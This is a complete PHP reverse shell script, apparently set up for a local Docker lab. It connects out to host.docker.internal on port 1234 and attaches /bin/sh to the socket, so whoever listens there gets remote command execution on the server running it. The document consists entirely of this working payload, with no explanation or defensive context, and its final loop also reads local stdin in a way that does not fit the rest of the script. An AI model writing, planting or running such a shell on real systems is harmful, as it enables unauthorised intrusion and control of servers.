<?php
$ip = 'host.docker.internal';
$port = 1234;

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    print("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
    0 => $sock,  // stdin is the reverse connection
    1 => $sock,  // stdout is the reverse connection
    2 => $sock   // stderr is the reverse connection
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
print("Successfully opened reverse shell to $ip:$port");

if (!is_resource($process)) {
    echo "Failed to open shell process\n";
    exit(1);
}

// Keep the script running to interact with the shell process
while (true) {
    // Read user input from stdin
    $input = rtrim(fgets(fopen('php://stdin', 'r')));

    // Send user input to the shell process
    fwrite($pipes[0], $input . PHP_EOL);

    // Display output from the shell process
    $output = fread($pipes[1], 4096);
    echo $output;
}

// Close the shell process on script termination
proc_close($process);

?>
